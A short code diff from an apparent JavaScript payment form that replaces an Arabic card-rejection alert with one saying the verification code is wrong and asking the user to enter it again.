@@ -288,7 +288,7 @@ const cuonter=()=>{
           }
         } else if (paymentInfo.status === "rejected") {
           // If rejected, show alert and stay on step 3
-          alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
+          alert("رمز التحقق غير صحيح, الرجاء ادخال الرمز مرة اخرى ")
         }
         // Reset OTP field and loading state
         setPaymentInfo({
